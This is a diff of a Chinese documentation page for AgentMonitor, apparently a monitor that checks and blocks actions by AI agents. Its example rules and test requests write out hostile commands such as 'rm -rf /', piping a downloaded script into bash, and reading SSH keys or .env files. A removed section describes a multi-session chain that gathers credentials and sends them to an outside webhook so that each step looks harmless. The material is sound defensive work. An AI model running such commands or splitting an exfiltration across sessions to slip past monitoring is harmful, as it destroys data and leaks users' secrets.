@@ -3,36 +3,34 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>AgentMonitor 配置与防御指南 - AgentMoss</title>
+  <title>AgentMonitor 细节、配置指南与监控粒度</title>
   <style>
-    :root{color-scheme:light;--bg:#f6f8fd;--ink:#101828;--muted:#667085;--brand:#3451db;--brand2:#7c3aed;--line:#dbe4f0;--surface:#fff;--danger:#d92d20;--good:#0f9f6e;--warn:#b7791f}*{box-sizing:border-box}body{margin:0;font-family:Inter,ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:linear-gradient(180deg,#fbfcff,#eef3fb);color:var(--ink)}a{color:var(--brand);font-weight:700}.page{max-width:1120px;margin:0 auto;padding:28px}.nav{display:flex;justify-content:space-between;align-items:center;gap:16px;margin-bottom:30px}.brand{display:flex;align-items:center;gap:12px;font-weight:800}.mark{width:42px;height:42px;border-radius:14px;display:grid;place-items:center;color:white;background:linear-gradient(135deg,var(--brand),var(--brand2))}.navlinks{display:flex;gap:10px;flex-wrap:wrap}.navlinks a{padding:10px 14px;border:1px solid var(--line);border-radius:999px;background:white;text-decoration:none;color:var(--ink)}.hero,.section{background:rgba(255,255,255,.9);border:1px solid var(--line);border-radius:28px;box-shadow:0 24px 80px rgba(35,56,118,.12);padding:26px;margin-bottom:20px}.hero h1{font-size:44px;line-height:1.05;margin:0 0 12px}.lead{font-size:18px;line-height:1.75;color:var(--muted)}h2{font-size:28px;margin:0 0 12px}h3{margin-top:22px}.toc{display:grid;grid-template-columns:repeat(5,1fr);gap:12px}.toc a{display:block;text-decoration:none;color:var(--ink);padding:14px;border:1px solid var(--line);border-radius:16px;background:#f8faff}p,li{line-height:1.75;color:#344054}pre{white-space:pre-wrap;overflow:auto;background:#101828;color:#eef2ff;padding:18px;border-radius:18px;font-size:13px;line-height:1.6}code{background:#f2f4f7;border:1px solid #e4e7ec;border-radius:8px;padding:2px 6px}.table{width:100%;border-collapse:collapse;background:white;border-radius:18px;overflow:hidden}.table th,.table td{text-align:left;vertical-align:top;padding:13px;border-bottom:1px solid var(--line)}.table th{background:#f8faff}.danger{color:var(--danger);font-weight:800}.good{color:var(--good);font-weight:800}.warn{color:var(--warn);font-weight:800}@media(max-width:860px){.toc{grid-template-columns:1fr}.hero h1{font-size:34px}.page{padding:18px}.nav{align-items:flex-start;flex-direction:column}}
+    :root{color-scheme:light;--bg:#f6f8fd;--ink:#101828;--muted:#667085;--brand:#3451db;--brand2:#7c3aed;--line:#dbe4f0;--surface:#fff;--danger:#d92d20;--good:#0f9f6e;--warn:#b7791f}*{box-sizing:border-box}body{margin:0;font-family:Inter,ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:linear-gradient(180deg,#fbfcff,#eef3fb);color:var(--ink)}a{color:var(--brand);font-weight:800}.page{max-width:1120px;margin:0 auto;padding:28px}.nav{display:flex;justify-content:space-between;align-items:center;gap:16px;margin-bottom:30px}.brand{display:flex;align-items:center;gap:12px;font-weight:900}.mark{width:42px;height:42px;border-radius:14px;display:grid;place-items:center;color:white;background:linear-gradient(135deg,var(--brand),var(--brand2))}.navlinks{display:flex;gap:10px;flex-wrap:wrap}.navlinks a{padding:10px 14px;border:1px solid var(--line);border-radius:999px;background:white;text-decoration:none;color:var(--ink)}.navlinks a[aria-current="page"]{background:linear-gradient(135deg,var(--brand),var(--brand2));color:white;border:0}.hero,.section{background:rgba(255,255,255,.92);border:1px solid var(--line);border-radius:28px;box-shadow:0 24px 80px rgba(35,56,118,.12);padding:26px;margin-bottom:20px}.hero h1{font-size:44px;line-height:1.05;margin:0 0 12px}.lead{font-size:18px;line-height:1.75;color:var(--muted)}h2{font-size:28px;margin:0 0 12px}h3{margin-top:22px}.toc{display:grid;grid-template-columns:repeat(5,1fr);gap:12px}.toc a{display:block;text-decoration:none;color:var(--ink);padding:14px;border:1px solid var(--line);border-radius:16px;background:#f8faff}p,li{line-height:1.75;color:#344054}pre{white-space:pre-wrap;overflow:auto;background:#101828;color:#eef2ff;padding:18px;border-radius:18px;font-size:13px;line-height:1.6}code{background:#f2f4f7;border:1px solid #e4e7ec;border-radius:8px;padding:2px 6px}.table{width:100%;border-collapse:collapse;background:white;border-radius:18px;overflow:hidden}.table th,.table td{text-align:left;vertical-align:top;padding:13px;border-bottom:1px solid var(--line)}.table th{background:#f8faff}.danger{color:var(--danger);font-weight:900}.good{color:var(--good);font-weight:900}.warn{color:var(--warn);font-weight:900}@media(max-width:860px){.toc{grid-template-columns:1fr}.hero h1{font-size:34px}.page{padding:18px}.nav{align-items:flex-start;flex-direction:column}}
   </style>
 </head>
 <body>
   <main class="page">
-    <nav class="nav"><div class="brand"><span class="mark">⛨</span><span>AgentMoss Docs</span></div><div class="navlinks"><a href="index.html">概览</a><a href="doc.html">文档</a><a href="https://github.com/agentmosi/agentmosi.github.io/tree/main/agentmonitor-v2">GitHub</a></div></nav>
+    <nav class="nav"><div class="brand"><span class="mark">⛨</span><span>AgentMonitor Docs</span></div><div class="navlinks"><a href="/">实时监控</a><a href="info.html">框架概括</a><a href="doc.html" aria-current="page">细节文档</a><a href="https://github.com/agentmosi/agentmosi.github.io/tree/main/agentmonitor-v2">GitHub</a></div></nav>
     <section class="hero">
-      <h1>AgentMonitor 配置与防御指南</h1>
-      <p class="lead">本页整合 <code>agentmonitor-demo/doc</code> 的架构、使用说明和威胁模型，说明如何配置 OpenClaw 插件、启动服务、验证 API，以及 AgentMonitor 具体防御哪些行为。</p>
-      <div class="toc"><a href="#quickstart">快速启动</a><a href="#openclaw">OpenClaw 插件配置</a><a href="#defense">防御内容与例子</a><a href="#global">全局关联分析</a><a href="#data-model">核心数据结构</a><a href="#api">API 与验证</a></div>
+      <h1>AgentMonitor 细节、配置指南与监控粒度</h1>
+      <p class="lead">本页说明如何把 AgentMonitor 接入本地 Agent runtime、如何验证 API，以及内部核心数据结构如何支撑实时监控、证据链、敏感数据流向和跨会话攻击链分析。</p>
+      <div class="toc"><a href="#quickstart">快速启动</a><a href="#config">配置指南</a><a href="#data-model">核心数据结构</a><a href="#granularity">监控粒度</a><a href="#api">API 与验证</a></div>
     </section>
 
     <section id="quickstart" class="section">
       <h2>1. 快速启动</h2>
-      <p>AgentMonitor Demo 服务位于 <code>agentmonitor-demo</code>。用户先从 GitHub 拉取仓库，再进入 demo 目录安装依赖并启动服务；默认监听 <code>http://127.0.0.1:19876</code>。</p>
+      <p>AgentMonitor Demo 默认监听 <code>http://127.0.0.1:19876</code>。根路径 <code>/</code> 和 <code>/index.html</code> 是实时监控台，<code>/info.html</code> 是框架概括，<code>/doc.html</code> 是本文档。</p>
       <pre>git clone git@github.com:agentmosi/agentmonitor.git
 cd agentmonitor/agentmonitor-demo
 env -u NODE_OPTIONS pnpm install
-env -u NODE_OPTIONS pnpm dev
+AGENTMONITOR_ENABLED=1 AGENTMONITOR_URL=http://127.0.0.1:19876 env -u NODE_OPTIONS pnpm dev
 
-# 健康检查
 curl http://127.0.0.1:19876/api/health</pre>
-      <p>本地实时仪表盘：<code>http://127.0.0.1:19876/</code>；产品概览：<code>/index.html</code>；本文档：<code>/doc.html</code>。</p>
     </section>
 
-    <section id="openclaw" class="section">
-      <h2>2. OpenClaw 插件配置</h2>
-      <p>OpenClaw 插件配置文件是 <code>~/.openclaw/openclaw.json</code>。插件入口已经独立在 <code>agentmonitor-demo/openclaw-plugin</code>，配置时将 <code>plugins.load.paths</code> 指向该目录，不需要修改 OpenClaw 源码。</p>
+    <section id="config" class="section">
+      <h2>2. 配置指南</h2>
+      <p>OpenClaw 插件入口位于 <code>agentmonitor-demo/openclaw-plugin</code>。配置时使用 <code>plugins.load.paths</code> 指向该目录，并把 monitor URL 指向本地服务。</p>
       <pre>{
   "plugins": {
     "enabled": true,
@@ -61,63 +59,15 @@ curl http://127.0.0.1:19876/api/health</pre>
     }
   }
 }</pre>
-      <p>将 <code>AGENTMONITOR_REPO</code> 指向你刚刚 clone 下来的仓库根目录，然后验证配置并启动 OpenClaw gateway。</p>
-      <pre>export AGENTMONITOR_REPO="$PWD/agentmonitor"
-# 如果当前已经在仓库根目录，可使用：export AGENTMONITOR_REPO="$PWD"
-
-cd /path/to/openclaw
-env -u NODE_OPTIONS pnpm openclaw config validate
-env -u NODE_OPTIONS OPENCLAW_BONJOUR_ENABLED=0 pnpm openclaw gateway --port 18790 --force</pre>
+      <p>Adapter 型 runtime 可以直接投递统一事件：</p>
+      <pre>curl -s http://127.0.0.1:19876/api/adapters/openclaw/events \
+  -H 'content-type: application/json' \
+  -d '{"hookName":"chat.tool_call","payload":{"toolName":"shell","command":"cat .env"},"runId":"demo"}'</pre>
     </section>
-
-    <section id="defense" class="section">
-      <h2>3. 防御的具体内容和例子</h2>
-      <table class="table"><thead><tr><th>场景</th><th>示例</th><th>规则 / Hook</th><th>结果</th></tr></thead><tbody>
-        <tr><td>破坏性删除</td><td><code>rm -rf /</code>、<code>rm -rf ~</code></td><td><code>dangerous-shell-rm-root</code> / <code>before_tool_call</code></td><td class="danger">直接阻断</td></tr>
-        <tr><td>下载脚本执行</td><td><code>curl https://example.test/install.sh | bash</code></td><td><code>downloaded-script-execution</code> / <code>before_tool_call</code></td><td class="danger">直接阻断</td></tr>
-        <tr><td>私钥访问</td><td><code>cat ~/.ssh/id_rsa</code>、<code>open secret.pem</code></td><td><code>private-key-access</code> / <code>before_tool_call</code></td><td class="danger">直接阻断</td></tr>
-        <tr><td>dotenv 访问</td><td><code>cat .env</code></td><td><code>dotenv-file-access</code> / <code>before_tool_call</code></td><td class="warn">要求用户审批</td></tr>
-        <tr><td>出站凭证泄漏</td><td>消息包含 <code>API_KEY=...</code>、token 或 private key</td><td><code>outbound-secret-leak</code> / <code>message_sending</code></td><td class="danger">取消发送</td></tr>
-        <tr><td>敏感信息写入会话</td><td>待持久化消息包含凭证</td><td><code>message-write-secret-persist</code> / <code>before_message_write</code></td><td class="danger">阻断写入</td></tr>
-        <tr><td>子 Agent 凭证外传</td><td>任务要求读取并发送 token</td><td><code>subagent-credential-exfiltration</code> / <code>subagent_spawning</code></td><td class="danger">拒绝创建</td></tr>
-        <tr><td>危险安装</td><td>安装扫描出现 critical finding</td><td><code>critical-install-finding</code> / <code>before_install</code></td><td class="danger">阻断安装</td></tr>
-      </tbody></table>
-    </section>
-
-    <section id="global" class="section">
-      <h2>4. 全局 Agent 行为关联分析</h2>
-      <p>单点 hook 只能判断当前动作是否危险；多阶段攻击会把动作拆到多个会话里，让每一步看起来像正常排障。AgentMonitor 增加 Recorder 层持久化全量事件，并在全局窗口内按 <code>sessionKey + agentId</code> 关联阶段。</p>
-      <h3>Recorder 架构</h3>
-      <ul>
-        <li><strong>EventRecorder 接口</strong>：统一 <code>addEvent</code>、<code>listEvents</code>、<code>listRuns</code>，上层 API 不绑定具体存储。</li>
-        <li><strong>MemoryEventStore</strong>：测试与轻量演示使用。</li>
-        <li><strong>SqliteEventRecorder</strong>：使用 Node <code>node:sqlite</code> 时写入 SQLite；当前 Node 未启用该内置模块时自动降级为 JSONL recorder，保持同一接口。</li>
-      </ul>
-      <h3>真实攻击链例子</h3>
-      <table class="table"><thead><tr><th>时间 / 会话</th><th>单步行为</th><th>单点看法</th><th>全局关联含义</th></tr></thead><tbody>
-        <tr><td>会话 A</td><td><code>find . -name .env -o -name '*key*' -o -name 'config*'</code></td><td>普通文件定位</td><td>凭证/配置位置侦察</td></tr>
-        <tr><td>会话 B</td><td><code>grep -n API_KEY .env.example config/settings.ts</code></td><td>排障读取示例配置</td><td>读取敏感变量名和上下文</td></tr>
-        <tr><td>会话 C</td><td><code>tar -czf /tmp/debug-bundle.tgz logs config .env.example</code></td><td>打包 debug 资料</td><td>将凭证相关材料暂存</td></tr>
-        <tr><td>会话 D</td><td>向外部 webhook 发送 <code>/tmp/debug-bundle.tgz</code></td><td>请求协助排查</td><td>外发阶段，攻击链闭环</td></tr>
-      </tbody></table>
-      <p>命中后返回 <code>cross-session-credential-staging</code>，严重级别 <code>critical</code>，证据链包含四个会话的事件 ID 和阶段说明。</p>
-      <pre>curl http://127.0.0.1:19876/api/global/findings
-
-{
-  "findings": [{
-    "ruleId": "cross-session-credential-staging",
-    "severity": "critical",
-    "involvedRunIds": ["run-recon", "run-read", "run-pack", "run-send"],
-    "evidenceEventIds": ["evt_file_a", "evt_read_b", "evt_pack_c", "evt_send_d"]
-  }]
-}</pre>
-    </section>
-
 
     <section id="data-model" class="section">
-      <h2>5. 核心数据结构：行为记录如何组织</h2>
-      <p>AgentMonitor 的行为记录采用 append-style 事件流模型。OpenClaw hook、工具调用检查、策略命中、消息发送与跨会话分析，最终都会归一化为一条 <code>AgentMonitorEvent</code>，写入统一的 <code>EventRecorder</code>。运行会话、证据链、行为图和全局攻击链都是从事件流派生出来的视图。</p>
-      <h3>AgentMonitorEvent</h3>
+      <h2>3. 核心数据结构</h2>
+      <p>所有运行时事件会归一化为 <code>AgentMonitorEvent</code>，再写入 <code>EventRecorder</code>。该模型既能承载实时 UI，也能承载持久审计和跨会话关联。</p>
       <pre>type AgentMonitorEvent = {
   id: string;
   timestamp: number;
@@ -132,85 +82,51 @@ env -u NODE_OPTIONS OPENCLAW_BONJOUR_ENABLED=0 pnpm openclaw gateway --port 1879
   payload: unknown;
   risk?: EventRisk;
   parentEventIds: string[];
-};</pre>
-      <table class="table"><thead><tr><th>字段</th><th>作用</th></tr></thead><tbody>
-        <tr><td><code>runId</code></td><td>AgentMonitor 侧运行会话 ID，用于左侧运行列表和单 run 行为图。</td></tr>
-        <tr><td><code>sessionKey</code> / <code>agentId</code></td><td>OpenClaw/x-Agent 侧会话与 agent 维度，用于跨 run、跨会话关联。</td></tr>
-        <tr><td><code>hookName</code> / <code>eventType</code></td><td>记录事件来自哪个 hook，以及归一化后的事件类别，如 <code>llm_input</code>、<code>tool_call</code>、<code>message_sending</code>、<code>policy_decision</code>、<code>hook_check</code>。</td></tr>
-        <tr><td><code>sourceTrust</code></td><td>来源信任域：<code>system</code>、<code>llm</code>、<code>tool</code>、<code>user</code>、<code>external</code>。</td></tr>
-        <tr><td><code>payload</code></td><td>原始上下文、工具参数、模型消息、工具结果或策略输出。</td></tr>
-        <tr><td><code>risk</code></td><td>可选风险信息，包含 <code>severity</code>、<code>ruleId</code>、<code>reason</code> 和 <code>evidencePaths</code>。</td></tr>
-        <tr><td><code>parentEventIds</code></td><td>父事件 ID 列表，用于证据链回溯和行为图边关系。</td></tr>
-      </tbody></table>
-      <h3>EventRecorder 接口</h3>
-      <pre>interface EventRecorder {
+};
+
+interface EventRecorder {
   addEvent(event: AgentMonitorEvent): AgentMonitorEvent;
   getEvent(eventId: string): AgentMonitorEvent | undefined;
   listEvents(filter?: { runId?: string }): AgentMonitorEvent[];
   listRuns(): RunSummary[];
 }</pre>
-      <p>上层 API 只依赖 <code>EventRecorder</code>，因此内存、SQLite、JSONL 等存储实现可以互换。<code>listRuns()</code> 不依赖单独 run 表，而是按事件中的 <code>runId</code> 聚合出 <code>RunSummary</code>：包含显示名、事件数、首尾时间和隐藏 raw run id 的标记。</p>
-      <h3>持久化结构</h3>
-      <p>SQLite recorder 使用单表 <code>events</code> 存储事件主字段，复杂对象以 JSON 字符串保存：</p>
-      <pre>CREATE TABLE events (
-  id TEXT PRIMARY KEY,
-  timestamp INTEGER NOT NULL,
-  run_id TEXT,
-  session_key TEXT,
-  session_id TEXT,
-  agent_id TEXT,
-  tool_call_id TEXT,
-  hook_name TEXT NOT NULL,
-  event_type TEXT NOT NULL,
-  source_trust TEXT NOT NULL,
-  payload_json TEXT NOT NULL,
-  risk_json TEXT,
-  parent_event_ids_json TEXT NOT NULL
-);</pre>
-      <p>关键索引包括时间索引、run 索引，以及 <code>session_key + agent_id</code> 索引，分别服务事件流展示、单会话检索和跨会话关联。Node 环境无法加载 <code>node:sqlite</code> 时会自动降级为 JSONL recorder，每行保存一条完整 <code>AgentMonitorEvent</code>。</p>
-      <h3>派生视图</h3>
-      <ul>
-        <li><strong>运行列表</strong>：<code>GET /api/runs</code> 从事件流按 <code>runId</code> 聚合。</li>
-        <li><strong>事件流</strong>：<code>GET /api/events</code> 和 <code>GET /api/events/stream</code> 返回历史事件和 SSE 实时事件。</li>
-        <li><strong>行为图</strong>：<code>GET /api/runs/:runId/graph</code> 根据事件和 <code>parentEventIds</code> 构建节点与边。</li>
-        <li><strong>证据链</strong>：<code>GET /api/runs/:runId/evidence?eventId=...</code> 从目标事件向前回溯上下文。</li>
-        <li><strong>全局发现</strong>：<code>GET /api/global/findings</code> 跨 run 扫描 <code>recon → sensitive_read → staging → egress</code> 阶段，输出 <code>GlobalFinding</code>。</li>
-      </ul>
-      <pre>{
-  "id": "evt_demo_1",
-  "timestamp": 1710000000000,
-  "runId": "run-read",
-  "sessionKey": "agent:main:demo",
-  "agentId": "main",
-  "hookName": "after_tool_call",
-  "eventType": "tool_result",
-  "sourceTrust": "tool",
-  "payload": { "toolName": "exec", "command": "grep -R API_KEY ." },
-  "risk": {
-    "severity": "warning",
-    "ruleId": "dotenv-file-access",
-    "reason": "Sensitive dotenv/config access",
-    "evidencePaths": ["payload.command"]
-  },
-  "parentEventIds": []
-}</pre>
+      <table class="table"><thead><tr><th>字段</th><th>用途</th></tr></thead><tbody>
+        <tr><td><code>runId</code></td><td>监控台左侧运行会话、单 run 事件筛选、行为树构建。</td></tr>
+        <tr><td><code>sessionKey</code> / <code>agentId</code></td><td>跨 run 关联同一 agent 或同一业务会话，发现多阶段攻击链。</td></tr>
+        <tr><td><code>hookName</code></td><td>保存原始 runtime hook，如 <code>chat.tool_call</code>、<code>message_sending</code>、<code>after_tool_call</code>。</td></tr>
+        <tr><td><code>eventType</code></td><td>归一化类别，如 <code>llm_input</code>、<code>tool_call</code>、<code>tool_result</code>、<code>policy_decision</code>。</td></tr>
+        <tr><td><code>sourceTrust</code></td><td>标记来源信任域：system、llm、tool、user、external。</td></tr>
+        <tr><td><code>parentEventIds</code></td><td>构建证据链和行为图边关系，解释某次阻断依赖哪些上游事件。</td></tr>
+      </tbody></table>
+    </section>
+
+    <section id="granularity" class="section">
+      <h2>4. 监控粒度</h2>
+      <p>AgentMonitor 采用“高价值状态转移优先”的粒度：默认采集决策点、工具边界和最终消息，不默认采集高频 token 流，避免实时监控被噪声淹没。</p>
+      <table class="table"><thead><tr><th>粒度</th><th>事件示例</th><th>默认策略</th><th>说明</th></tr></thead><tbody>
+        <tr><td>LLM 边界</td><td><code>llm_input</code>、<code>llm_output</code>、<code>chat.final</code></td><td class="good">采集</td><td>用于理解模型收到什么、最终输出什么。</td></tr>
+        <tr><td>工具边界</td><td><code>tool_call</code>、<code>tool_result</code>、<code>chat.tool_call</code></td><td class="danger">采集并可阻断</td><td>最关键的副作用边界，支持命令、文件、网络和安装检查。</td></tr>
+        <tr><td>消息外发</td><td><code>message_sending</code>、<code>before_message_write</code></td><td class="danger">采集并可阻断</td><td>用于防止 token、private key、API key 出站或持久化。</td></tr>
+        <tr><td>策略决策</td><td><code>policy_decision</code>、<code>hook_check</code></td><td class="good">采集</td><td>记录 block、allow、requireApproval 与规则命中原因。</td></tr>
+        <tr><td>Token 流</td><td><code>chat.delta</code></td><td class="warn">默认不采集 chat.delta</td><td>仅在调试模式启用，防止吞吐和存储压力过高。</td></tr>
+      </tbody></table>
     </section>
 
     <section id="api" class="section">
-      <h2>6. API 与验证</h2>
-      <h3>工具调用检查</h3>
-      <pre>curl -s http://127.0.0.1:19876/api/tool-call/check \\
-  -H 'content-type: application/json' \\
-  -d '{"toolName":"shell","params":{"command":"rm -rf /"},"runId":"demo"}'</pre>
-      <h3>通用干预 Hook 检查</h3>
-      <pre>curl -s http://127.0.0.1:19876/api/hook/check \\
-  -H 'content-type: application/json' \\
-  -d '{"hookName":"message_sending","event":{"content":"API_KEY=sk-test-secret-value"},"runId":"demo"}'</pre>
-      <h3>事件查询</h3>
-      <pre>curl http://127.0.0.1:19876/api/events
-curl http://127.0.0.1:19876/api/runs
-curl http://127.0.0.1:19876/api/events/stream</pre>
-      <p>测试命令：</p>
+      <h2>5. API 与验证</h2>
+      <pre>curl -s http://127.0.0.1:19876/api/tool-call/check \
+  -H 'content-type: application/json' \
+  -d '{"toolName":"shell","params":{"command":"rm -rf /"},"runId":"demo"}'
+
+curl -s http://127.0.0.1:19876/api/hook/check \
+  -H 'content-type: application/json' \
+  -d '{"hookName":"message_sending","event":{"content":"API_KEY=sk-test-secret-value"},"runId":"demo"}'
+
+curl http://127.0.0.1:19876/api/events
+GET /api/events/stream
+GET /api/runs
+GET /api/global/findings</pre>
+      <p>本地验证：</p>
       <pre>cd agentmonitor/agentmonitor-demo
 env -u NODE_OPTIONS pnpm test
 env -u NODE_OPTIONS pnpm typecheck</pre>
